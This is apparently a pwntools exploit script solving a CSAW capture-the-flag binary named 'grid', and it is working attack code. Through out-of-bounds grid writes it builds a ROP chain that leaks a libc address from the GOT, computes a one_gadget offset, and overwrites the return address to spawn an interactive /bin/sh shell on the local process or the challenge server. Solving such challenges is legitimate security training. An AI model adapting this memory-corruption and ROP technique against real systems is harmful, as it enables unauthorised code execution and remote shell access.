#!/usr/bin/env python3

from pwn import *

exe = ELF("./grid", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
stdc = ELF('./libstdc.so.6.0.25', checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe
context.arch = 'amd64'
context.terminal = 'tmux split -h'.split(' ')
# context.log_level = 'debug'

"""
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

og_off = 0x4f3c2

if args.REMOTE:
    p = remote('pwn.chal.csaw.io', 5013)
else:
    p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path + ' ' + stdc.path})

    if args.GDB:
        gdb.attach(p, '''
            break * 0x400b26
            break * 0x400bbe
            continue
            ''')

def _dump():
    p.sendlineafter(b'shape> ', b'd')

def add(r, c, value):
    log.info(f'Adding {value}')
    p.sendlineafter(b'shape> ', value)
    p.sendlineafter(b'loc> ', f'{r} {c}'.encode())

def get_coord(index):
    return index//10, index%10

ret_addr    = 0x4008ae
grid_func   = 0x400bc0
cout_addr   = 0x6020a0
stream_plt  = 0x4008e0
pop_di_addr = 0x400ee3
pop_rsi_ret = 0x400ee1
cout_print  = 0x400cae
ccout_print = 0x400b97
main_addr   = 0x400daa
start_addr  = 0x400970

cstream_addr = exe.sym._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc

writes = {-0x1c: b'A'*8,
          0x00: p64(ret_addr),
          0x08: p64(pop_di_addr),
          0x14: p32(0),
          0x18: p64(pop_rsi_ret),
          0x20: p64(exe.got.__libc_start_main),
          0x30: p64(cstream_addr),
          0x38: p64(ret_addr),
          0x40: p64(ret_addr),
          0x48: p64(ret_addr),
          0x50: b'\xaa'
         }

for off, addr in writes.items():
    for index, value in enumerate(addr):
        r, c = get_coord(index+0x78+off)
        add(r, c, bytes([value]))

add(cout_addr, cout_addr, b'X')

_dump()
p.recvuntil(b'A' * 8 + b'\n')

libc_start_main = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = libc_start_main - libc.sym.__libc_start_main
og_addr = libc.address + og_off

log.info(f'libc_leak = {hex(libc_start_main)}')
log.info(f'libc @ {hex(libc.address)}')
log.info(f'og @ {hex(og_addr)}')

writes = {0: p64(og_addr),
          0x40: p64(0),
          0x48: p64(0),
          0x70: p64(0),
          0x78: p64(0),
          0x80: p64(0)}

for off, addr in writes.items():
    for index, value in enumerate(addr):
        r, c = get_coord(index+0x78+off)
        add(r, c, bytes([value]))

_dump()

p.interactive()
